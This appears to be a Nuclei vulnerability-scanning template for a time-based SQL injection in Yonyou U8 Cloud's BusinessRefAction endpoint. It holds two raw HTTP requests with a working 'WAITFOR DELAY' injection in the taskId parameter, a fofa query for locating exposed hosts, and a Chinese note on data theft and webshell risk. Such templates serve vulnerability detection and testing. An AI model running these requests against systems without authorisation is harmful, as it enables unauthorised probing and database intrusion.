http:
    - matchers:
        - condition: and
          dsl:
            - duration_1>=4 && duration_1<=5
            - duration_2>=8 && duration_2<=9
          type: dsl
      raw:
        - |
          GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.web.reference.BusinessRefAction&method=getTaskRepTreeRef&taskId=1%27);WAITFOR+DELAY+%270:0:4%27-- HTTP/1.1
          Host: {{Hostname}}
        - |
          GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.web.reference.BusinessRefAction&method=getTaskRepTreeRef&taskId=1%27);WAITFOR+DELAY+%270:0:8%27-- HTTP/1.1
          Host: {{Hostname}}
id: yongyouU8-Cloud-BusinessRefAction-sql
info:
    author: Superhero
    description: |-
        fofa: title=="U8C"
        用友U8 Cloud BusinessRefAction接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: 用友U8 Cloud BusinessRefAction SQL延时注入漏洞
    reference:
        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486308&idx=1&sn=c1d136e10f1d872216ea42a83702ef32&chksm=c267be57f510374107556630ed5288c91e286341762929e92fb090cfed68120edcbcc89be4f6&token=661111678&lang=zh_CN#rd
    severity: high
    tags:
        - 用友u8
        - Servlet
        - 用友U8
